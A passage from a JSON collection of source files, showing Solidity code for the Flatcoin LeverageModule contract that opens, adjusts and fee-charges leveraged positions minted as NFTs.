margin and size criteria.\n    /// @param _margin The margin to be deposited.\n    /// @param _size The size of the position.\n    function checkLeverageCriteria(uint256 _margin, uint256 _size) public view {\n        uint256 leverage = ((_margin + _size) * 1e18) / _margin;\n\n        if (leverage < leverageMin) revert FlatcoinErrors.LeverageTooLow(leverageMin, leverage);\n        if (leverage > leverageMax) revert FlatcoinErrors.LeverageTooHigh(leverageMax, leverage);\n        if (_margin < marginMin) revert FlatcoinErrors.MarginTooSmall(marginMin, _margin);\n    }\n\n    /// @notice Returns the trade fee for a given size.\n    /// @param _size The size of the trade.\n    /// @return _tradeFee The trade fee.\n    function getTradeFee(uint256 _size) external view returns (uint256 _tradeFee) {\n        return levTradingFee._multiplyDecimal(_size);\n    }\n\n    /////////////////////////////////////////////\n    //            Internal Functions           //\n    /////////////////////////////////////////////\n\n    /// @notice Handles incrementing the tokenIdNext and minting the nft\n    /// @param _to the minter's address\n    /// @return _tokenId the tokenId of the new NFT.\n    function _mint(address _to) internal returns (uint256 _tokenId) {\n        _tokenId = tokenIdNext;\n\n        _safeMint(_to, tokenIdNext);\n\n        tokenIdNext += 1;\n    }\n\n    /// @notice Returns the maximum age of the oracle price to be used.\n    /// @param _executableAtTime The time at which the order is executable.\n    /// @return _maxAge The maximum age of the oracle price to be used.\n    function _getMaxAge(uint64 _executableAtTime) internal view returns (uint32 _maxAge) {\n        return (block.timestamp - _executableAtTime).toUint32();\n    }\n\n    /////////////////////////////////////////////\n    //             Owner Functions             //\n    /////////////////////////////////////////////\n\n    /// @notice Setter for the leverage open/close fee.\n    /// @dev Fees can be set to 0 if needed.\n    /// @param _levTradingFee The new leverage trading fee.\n    function setLevTradingFee(uint256 _levTradingFee) public onlyOwner {\n        // Set fee cap to max 1%.\n        // This is to avoid fat fingering but if any change is needed, the owner needs to\n        // upgrade this module.\n        if (_levTradingFee > 0.01e18) revert FlatcoinErrors.InvalidFee(_levTradingFee);\n\n        levTradingFee = _levTradingFee;\n    }\n\n    /// @notice Setter for the leverage position criteria limits.\n    /// @dev The limits are used to ensure that the position is valuable and there is an incentive to liquidate it.\n    /// @param _marginMin The new minimum margin limit.\n    /// @param _leverageMin The new minimum leverage limit.\n    /// @param _leverageMax The new maximum leverage limit.\n    function setLeverageCriteria(uint256 _marginMin, uint256 _leverageMin, uint256 _leverageMax) public onlyOwner {\n        if (_leverageMax <= _leverageMin) revert FlatcoinErrors.InvalidLeverageCriteria();\n\n        marginMin = _marginMin;\n        leverageMin = _leverageMin;\n        leverageMax = _leverageMax;\n    }\n}"
    },
    {
      "filename": "flatcoin-v1/src/LeverageModule.sol",
      "content": "// SPDX-License-Identifier: SEE LICENSE IN LICENSE\npragma solidity 0.8.18;\n\nimport {SafeCastUpgradeable} from \"openzeppelin-contracts-upgradeable/contracts/utils/math/SafeCastUpgradeable.sol\";\nimport {ERC721LockableEnumerableUpgradeable} from \"./misc/ERC721LockableEnumerableUpgradeable.sol\";\n\nimport {DecimalMath} from \"./libraries/DecimalMath.sol\";\nimport {PerpMath} from \"./libraries/PerpMath.sol\";\nimport {FlatcoinErrors} from \"./libraries/FlatcoinErrors.sol\";\nimport {FlatcoinStructs} from \"./libraries/FlatcoinStructs.sol\";\nimport {FlatcoinModuleKeys} from \"./libraries/FlatcoinModuleKeys.sol\";\nimport {FlatcoinEvents} from \"./libraries/FlatcoinEvents.sol\";\nimport {ModuleUpgradeable} from \"./abstracts/ModuleUpgradeable.sol\";\n\nimport {IFlatcoinVault} from \"./interfaces/IFlatcoinVault.sol\";\nimport {ILeverageModule} from \"./interfaces/ILeverageModule.sol\";\nimport {ILiquidationModule} from \"./interfaces/ILiquidationModule.sol\";\nimport {IOracleModule} from \"./interfaces/IOracleModule.sol\";\nimport {IPointsModule} from \"./interfaces/IPointsModule.sol\";\nimport {ILimitOrder} from \"./interfaces/ILimitOrder.sol\";\n\n/// @title LeverageModule\n/// @author dHEDGE\n/// @notice Contains functions to create/manage leverage positions.\n/// @dev This module shouldn't hold any funds but can direct the vault to transfer funds.\ncontract LeverageModule is ILeverageModule, ModuleUpgradeable, ERC721LockableEnumerableUpgradeable {\n    using SafeCastUpgradeable for *;\n    using DecimalMath for uint256;\n\n    /// @notice ERC721 token ID increment on mint.\n    uint256 public tokenIdNext;\n\n    /// @notice Leverage trading fee. Charged for opening, adjusting or closing a position.\n    /// @dev 1e18 = 100%\n    uint256 public levTradingFee; // Fee for leverage position open/close. 1e18 = 100%\n\n    /// @notice Leverage position criteria limits\n    /// @notice A minimum margin limit adds a cost to create a position and ensures it can be liquidated at high leverage\n    uint256 public marginMin;\n\n    /// @notice Minimum leverage limit ensures that the position is valuable and adds long open interest\n    uint256 public leverageMin;\n\n    /// @notice Maximum leverage limit ensures that the position is safely liquidatable by keepers\n    uint256 public leverageMax;\n\n    /// @dev To prevent the implementation contract from being used, we invoke the _disableInitializers\n    /// function in the constructor to automatically lock it when it is deployed.\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() {\n        _disableInitializers();\n    }\n\n    /// @notice Function to initialize this contract.\n    function initialize(\n        IFlatcoinVault _vault,\n        uint256 _levTradingFee,\n        uint256 _marginMin,\n        uint256 _leverageMin,\n        uint256 _leverageMax\n    ) external initializer {\n        __Module_init(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY, _vault);\n        __ERC721_init(\"Flatmoney Leveraged Positions\", \"LEV\");\n\n        setLevTradingFee(_levTradingFee);\n        setLeverageCriteria(_marginMin, _leverageMin, _leverageMax);\n    }\n\n    /////////////////////////////////////////////\n    //         External Write Functions         //\n    /////////////////////////////////////////////\n\n    /// @notice Leverage open function. Mints ERC721 token receipt.\n    /// @dev Has to be used in conjunction with the DelayedOrder module.\n    /// @dev Uses the Pyth network price to execute.\n    /// @param _account The user account which has a pending open leverage order.\n    /// @param _keeper The address of the keeper executing the order.\n    /// @param _order The order to be executed.\n    /// @return _newTokenId The ERC721 token ID of the new leverage position.\n    function executeOpen(\n        address _account,\n        address _keeper,\n        FlatcoinStructs.Order calldata _order\n    ) external whenNotPaused onlyAuthorizedModule returns (uint256 _newTokenId) {\n        // Make sure the oracle price is after the order executability time\n        uint32 maxAge = _getMaxAge(_order.executableAtTime);\n\n        FlatcoinStructs.AnnouncedLeverageOpen memory announcedOpen = abi.decode(\n            _order.orderData,\n            (FlatcoinStructs.AnnouncedLeverageOpen)\n        );\n\n        // Check that buy price doesn't exceed requested price.\n        (uint256 entryPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).getPrice({\n            maxAge: maxAge\n        });\n\n        if (entryPrice > announcedOpen.maxFillPrice)\n            revert FlatcoinErrors.HighSlippage(entryPrice, announcedOpen.maxFillPrice);\n\n        vault.checkSkewMax({additionalSkew: announcedOpen.additionalSize});\n\n        {\n            // The margin change is equal to funding fees accrued to longs and the margin deposited by the trader.\n            vault.updateGlobalPositionData({\n                price: entryPrice,\n                marginDelta: int256(announcedOpen.margin),\n                additionalSizeDelta: int256(announcedOpen.additionalSize)\n            });\n\n            _newTokenId = _mint(_account);\n\n            vault.setPosition(\n                FlatcoinStructs.Position({\n                    lastPrice: entryPrice,\n                    marginDeposited: announcedOpen.margin,\n                    additionalSize: announcedOpen.additionalSize,\n                    entryCumulativeFunding: vault.cumulativeFundingRate()\n                }),\n                _newTokenId\n            );\n        }\n\n        // Check that the new position isn't immediately liquidatable.\n        if (\n            ILiquidationModule(vault.moduleAddress(FlatcoinModuleKeys._LIQUIDATION_MODULE_KEY)).canLiquidate(\n                _newTokenId\n            )\n        ) revert FlatcoinErrors.PositionCreatesBadDebt();\n\n        // Mint points\n        IPointsModule pointsModule = IPointsModule(vault.moduleAddress(FlatcoinModuleKeys._POINTS_MODULE_KEY));\n        pointsModule.mintLeverageOpen(_account, announcedOpen.additionalSize);\n\n        // Settle the collateral\n        vault.updateStableCollateralTotal(int256(announcedOpen.tradeFee)); // pay the trade fee to stable LPs\n        vault.sendCollateral({to: _keeper, amount: _order.keeperFee}); // pay the keeper their fee\n\n        emit FlatcoinEvents.LeverageOpen(_account, _newTokenId);\n    }\n\n    /// @notice Leverage adjust function.\n    /// @dev Needs to be used in conjunction with the DelayedOrder module.\n    /// @param _account The user account which has a pending adjust leverage order.\n    /// @param _keeper The address of the keeper executing the order.\n    /// @param _order The order to be executed.\n    function executeAdjust(\n        address _account,\n        address _keeper,\n        FlatcoinStructs.Order calldata _order\n    ) external whenNotPaused onlyAuthorizedModule {\n        uint32 maxAge = _getMaxAge(_order.executableAtTime);\n\n        FlatcoinStructs.AnnouncedLeverageAdjust memory announcedAdjust = abi.decode(\n            _order.orderData,\n            (FlatcoinStructs.AnnouncedLeverageAdjust)\n        );\n\n        (uint256 adjustPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).getPrice({\n            maxAge: maxAge\n        });\n\n        if (announcedAdjust.additionalSizeAdjustment >= 0) {\n            // Given that the size of a position is being increased, it's necessary to check that\n            // it doesn't exceed the max skew limit.\n            vault.checkSkewMax(uint256(announcedAdjust.additionalSizeAdjustment));\n\n            if (adjustPrice > announcedAdjust.fillPrice)\n                revert FlatcoinErrors.HighSlippage(adjustPrice, announcedAdjust.fillPrice);\n        } else {\n            if (adjustPrice < announcedAdjust.fillPrice)\n                revert FlatcoinErrors.HighSlippage(adjustPrice, announcedAdjust.fillPrice);\n        }\n\n        FlatcoinStructs.Position memory position = vault.getPosition(announcedAdjust.tokenId);\n\n        // Fees come out from the margin if the margin is being reduced or remains unchanged (meaning the size is being modified).\n        int256 marginAdjustment = (announcedAdjust.marginAdjustment > 0)\n            ? announcedAdjust.marginAdjustment\n            : announcedAdjust.marginAdjustment - int256(announcedAdjust.totalFee);\n\n        vault.updateGlobalPositionData({\n            price: adjustPrice,\n            marginDelta: marginAdjustment,\n            additionalSizeDelta: announcedAdjust.additionalSizeAdjustment\n        });\n\n        int256 cumulativeFunding = vault.cumulativeFundingRate();\n\n        // This accounts for the profit loss and funding fees accrued till now.\n        uint256 newMargin = (marginAdjustment +\n            PerpMath\n                ._getPositionSummary({position: position, nextFundingEntry: cumulativeFunding, price: adjustPrice})\n                .marginAfterSettlement).toUint256();\n\n        uint256 newAdditionalSize = (int256(position.additionalSize) + announcedAdjust.additionalSizeAdjustment)\n            .toUint256();\n\n        // Check that the new position isn't immediately liquidatable.\n        if (\n            newMargin <=\n            ILiquidationModule(vault.moduleAddress(FlatcoinModuleKeys._LIQUIDATION_MODULE_KEY)).getLiquidationMargin(\n                newAdditionalSize,\n                adjustPrice\n            )\n        ) revert FlatcoinErrors.PositionCreatesBadDebt();\n\n        // Check that the leverage isn't too high.\n        checkLeverageCriteria(newMargin, newAdditionalSize);\n\n        vault.setPosition(\n            FlatcoinStructs.Position({\n                lastPrice: adjustPrice,\n                marginDeposited: newMargin,\n                additionalSize: newAdditionalSize,\n                entryCumulativeFunding: cumulativeFunding\n            }),\n            announcedAdjust.tokenId\n        );\n\n        // Unlock the position token to allow for transfers.\n        _unlock(announcedAdjust.tokenId);\n\n        // Mint points.\n        if (announcedAdjust.additionalSizeAdjustment > 0) {\n            address positionOwner = ownerOf(announcedAdjust.tokenId);\n            IPointsModule pointsModule = IPointsModule(vault.moduleAddress(FlatcoinModuleKeys._POINTS_MODULE_KEY));\n\n            pointsModule.mintLeverageOpen(positionOwner, uint256(announcedAdjust.additionalSizeAdjustment));\n        }\n\n        if (announcedAdjust.tradeFee > 0) vault.updateStableCollateralTotal(int256(announcedAdjust.tradeFee));\n\n        // Sending keeper fee from order contract to the executor.\n        vault.sendCollateral({to: _keeper, amount: _order.keeperFee});\n\n        if (announcedAdjust.marginAdjustment < 0) {\n            // We send the user that much margin they requested during announceLeverageAdjust().\n            // However their remaining margin is reduced by the fees.\n            // It is accounted in announceLeverageAdjust().\n            uint256 marginToWithdraw = uint256(announcedAdjust.marginAdjustment * -1);\n\n            // Withdrawing margin from the vault and sending it to the user.\n            vault.sendCollateral({to: _account,"
    }
  ]
}